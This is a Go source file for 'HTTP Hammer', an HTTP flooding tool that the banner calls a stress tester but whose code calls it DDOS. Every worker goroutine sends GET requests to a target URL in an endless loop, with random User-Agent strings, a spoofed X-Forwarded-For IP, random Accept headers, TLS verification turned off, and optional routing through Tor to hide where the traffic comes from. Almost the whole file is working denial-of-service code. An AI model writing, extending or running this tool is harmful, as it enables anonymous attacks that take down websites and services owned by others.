package attack

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"sync/atomic"

	"github.com/corpix/uarand"
	"github.com/logrusorgru/aurora"
	log "github.com/sirupsen/logrus"
)

var acceptAll []map[string]string = []map[string]string{
	{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
	},
	{
		"Accept-Encoding": "gzip, deflate",
	},
	{
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
	},
	{
		"Accept":          "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip",
		"Accept-Charset":  "iso-8859-1",
	},
	{
		"Accept":         "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
		"Accept-Charset": "iso-8859-1",
	},
	{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "utf-8, iso-8859-1;q=0.5, *;q=0.1",
		"Accept-Charset":  "utf-8, iso-8859-1;q=0.5",
	},
	{
		"Accept":          "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
		"Accept-Language": "en-US,en;q=0.5",
	},
	{
		"Accept":          "text/html, application/xhtml+xml, image/jxr, */*",
		"Accept-Language": "utf-8, iso-8859-1;q=0.5, *;q=0.1",
		"Accept-Encoding": "gzip",
		"Accept-Charset":  "utf-8, iso-8859-1;q=0.5",
	},
	{
		"Accept":          "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip",
		"Accept-Charset":  "utf-8, iso-8859-1;q=0.5",
	},
	{
		"Accept":          "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
	},
	{
		"Accept-Charset":  "utf-8, iso-8859-1;q=0.5",
		"Accept-Language": "utf-8, iso-8859-1;q=0.5, *;q=0.1",
	},
	{
		"Accept": "text/html, application/xhtml+xml",
	},
	{
		"Accept-Language": "en-US,en;q=0.5",
	},
	{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Encoding": "br;q=1.0, gzip;q=0.8, *;q=0.1",
	},
	{
		"Accept":         "text/plain;q=0.8,image/png,*/*;q=0.5",
		"Accept-Charset": "iso-8859-1",
	},
}

var Version string = "v1.0"

func Init() {
	ClearScreen()

	fmt.Printf(`
██╗  ██╗████████╗████████╗██████╗     ██╗  ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██║  ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
███████║   ██║      ██║   ██████╔╝    ███████║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
██╔══██║   ██║      ██║   ██╔═══╝     ██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
██║  ██║   ██║      ██║   ██║         ██║  ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝															
TCP stress testing script (http, https, telnet...)                                     %s
C0d3d by %s


`, Version, aurora.BgRed(" B L A D E ").White().Bold())
	log.SetFormatter(&log.TextFormatter{
		FullTimestamp:   true,
		TimestampFormat: "2006-01-02 15:04:05",
		ForceColors:     true,
	})
}

func ClearScreen() {
	clear := make(map[string]func() error)
	clear["linux"] = func() error {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		return cmd.Run()
	}
	clear["windows"] = func() error {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		return cmd.Run()
	}

	clearFunc, ok := clear[runtime.GOOS]
	if ok {
		err := clearFunc()
		if err != nil {
			log.Error(err.Error())
		}
	}
}

type DDOS struct {
	url      string
	https    bool
	workers  int
	tor      bool
	torProxy string

	successRequests int64
	failedRequests  int64
	amountRequests  int64
}

func New(targetUrl string, workers int, tor bool, torProxy string) DDOS {

	u, err := url.Parse(targetUrl)
	if err != nil {
		log.Error(err.Error())
	}

	https := u.Scheme == "https"

	return DDOS{
		url:      targetUrl,
		https:    https,
		workers:  workers,
		tor:      tor,
		torProxy: torProxy,

		successRequests: 0,
		failedRequests:  0,
		amountRequests:  0,
	}
}

func (d *DDOS) Run() {

	log.Info(fmt.Sprintf("Starting %d workers", d.workers))
	for i := 0; i < d.workers; i++ {
		go func(index int) {
			for {

				transport := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				}

				if d.tor {
					torProxyUrl, err := url.Parse("socks5://" + d.torProxy)
					if err != nil {
						log.Error(err.Error())
					}

					transport.Proxy = http.ProxyURL(torProxyUrl)
				}

				req, err := http.NewRequest("GET", d.url, nil)
				if err != nil {
					log.Error(err.Error())
				}

				req.Close = true

				req.Header.Add("User-Agent", uarand.GetRandom())
				req.Header.Add("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

				for key, value := range acceptAll[rand.Intn(len(acceptAll))] {
					req.Header.Add(key, value)
				}

				client := &http.Client{
					Transport: transport,
				}

				resp, err := client.Do(req)
				atomic.AddInt64(&d.amountRequests, 1)
				if err != nil {
					atomic.AddInt64(&d.failedRequests, 1)
				} else {
					err = resp.Body.Close()
					if err != nil {
						log.Error(err.Error())
						atomic.AddInt64(&d.failedRequests, 1)
					}
					atomic.AddInt64(&d.successRequests, 1)
				}

				d.PrintStats()
			}
		}(i)
	}

}

func (d *DDOS) PrintStats() {
	fmt.Printf("\rAmount of requests: %d, Success requests: %d, Failed Request: %d ",
		aurora.Bold(d.amountRequests),
		aurora.BgGreen(d.successRequests).White().Bold(),
		aurora.BgRed(d.failedRequests).White().Bold(),
	)
}
